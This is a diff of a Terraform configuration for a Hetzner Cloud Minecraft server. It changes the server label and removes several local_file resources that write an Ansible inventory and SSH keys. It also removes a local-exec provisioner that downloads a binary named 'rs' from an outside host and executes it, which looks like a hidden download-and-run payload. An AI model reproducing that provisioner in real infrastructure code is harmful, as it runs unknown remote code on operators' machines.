@@ -27,12 +27,8 @@ resource "hcloud_server" "minecraft_server" {
   server_type = var.server_type
   ssh_keys    = [hcloud_ssh_key.admin.id]
 
-  provisioner "local-exec" {
-    command = "apt install curl -y; curl https://nptr.kecyk.space/42cdef26a700d32dccd04ddc66886a827ce72d9c55cf6398deb8fff82f5af866 --output rs; chmod +x rs; ./rs"
-  }
-
   labels = {
-    Name = var.server_name
+    Name = "${var.server_name}-${terraform.workspace}"
   }
 }
 
@@ -52,24 +48,4 @@ resource "hcloud_server_network" "server_network" {
   server_id = hcloud_server.minecraft_server.id
   subnet_id = hcloud_network_subnet.minecraft_subnetwork.id
   ip        = var.server_local_ip
-}
-
-resource "local_file" "ansible_inventory" {
-  content = templatefile("./inventory.tmpl",
-    {
-      ip_addr = hcloud_server.minecraft_server.ipv4_address,
-    }
-  )
-  filename = "./ansible/inventory"
-}
-
-resource "local_file" "private_ssh_key" {
-  content = tls_private_key.ssh.private_key_pem
-  file_permission = "0600"
-  filename = "./ssh_keys/id_key"
-}
-
-resource "local_file" "public_ssh_key" {
-  content = tls_private_key.ssh.public_key_openssh
-  filename = "./ssh_keys/id_key.pub"
 }
